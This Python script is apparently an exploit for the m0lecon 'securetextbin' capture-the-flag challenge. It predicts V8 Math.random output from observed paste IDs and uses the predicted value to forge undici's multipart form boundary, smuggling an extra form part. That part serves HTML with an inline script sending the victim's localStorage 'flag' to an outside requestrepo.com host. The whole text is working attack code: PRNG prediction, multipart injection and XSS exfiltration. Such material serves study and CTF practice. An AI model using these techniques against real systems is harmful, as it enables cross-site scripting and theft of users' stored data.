import sys
import requests
import subprocess


URL = "https://09e79ecfa54a-securetextbin.challs.m0lecon.it/"

def get_ids():
    ids = []
    for _ in range(10):
        form = {"file": "a"}
        try:
            r = requests.post(URL, data=form, allow_redirects=False)
            ids.append(r.headers["Location"].split("/")[-1])
        except Exception as e:
            print(f"Request error: {e}", file=sys.stderr)
            sys.exit(3)

    return ids[::-1]

def predict(ids):
    with open("data", "w") as f:
        for id in ids:
            f.write(f"{id}\n")
    
    p = subprocess.check_output("cat data | ../v8_rand_buster/blackbox_predict.py", shell=True, text=True)
    ids2 = p.strip()
    p = subprocess.check_output(f"/tmp/v8_rand_buster/{ids2.split("\n")[-1]}".replace("-g 5", "-g 1000000"), shell=True, text=True)
    ids = list(map(int, filter(None,p.split("\n"))))

    while True:
        r = requests.post(URL, data={"file": "a"}, allow_redirects=False)
        next_id = int(r.headers["Location"].split("/")[-1])

        try:
            idx = ids.index(next_id)
            print(f"IDX: {idx} {next_id}")
            p = subprocess.check_output(f"/tmp/v8_rand_buster/{ids2.split("\n")[-1]}".replace("-g 5", "-g 1000000").replace("1000000000000", "100000000000"), shell=True, text=True)
            ids = list(map(int, filter(None,p.split("\n"))))

            next_data = ids[idx-10:idx][::-1]
            return next_data
        except Exception as e:
            print(e)


    return next_data

next_math_randomz = predict(get_ids())

print(next_math_randomz)
form_undici_palle = "0" + str(next_math_randomz[1])

print(f"Form undici palle: {form_undici_palle}")

r = requests.post(URL, data={
    "file": f"""a
--MYBOUNDARY
Content-Type: text/html
Content-Security-Policy: script-src 'unsafe-inline'

a<script>window.open(`https://bw15zh2p.requestrepo.com/?data=${{localStorage.getItem('flag')}}`)</script>
--MYBOUNDARY--
bar
------formdata-undici-{form_undici_palle}
Content-Disposition: form-data; name="id"

13371337
------formdata-undici-{form_undici_palle}
Content-Disposition: form-data; name="content_type"

multipart/x-mixed-replace; boundary=MYBOUNDARY""".replace("\n","\r\n")}, 
files={"file": ("a",f"""a
--MYBOUNDARY
Content-Type: text/html
Content-Security-Policy: script-src 'unsafe-inline'

a<script>window.open(`https://bw15zh2p.requestrepo.com/?data=${{localStorage.getItem('flag')}}`)</script>
--MYBOUNDARY--
bar
------formdata-undici-{form_undici_palle}
Content-Disposition: form-data; name="id"

13371337
------formdata-undici-{form_undici_palle}
Content-Disposition: form-data; name="content_type"

multipart/x-mixed-replace; boundary=MYBOUNDARY""".replace("\n","\r\n"),"c")})

print(r.text, r.url)
